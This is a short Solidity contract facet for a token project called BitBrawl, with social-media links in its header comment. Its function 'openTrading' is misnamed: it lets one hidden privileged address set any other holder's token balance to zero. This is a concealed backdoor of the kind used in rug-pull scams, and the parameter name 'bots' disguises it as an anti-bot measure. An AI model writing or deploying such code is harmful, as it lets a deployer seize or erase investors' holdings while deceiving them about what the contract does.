/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://t.me/bitbrawl
    // Twitter: https://twitter.com/bitbrawlio
    // Website: https://www.bitbrawl.io/
    // Discord: https://discord.com/invite/bitbrawl
 
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
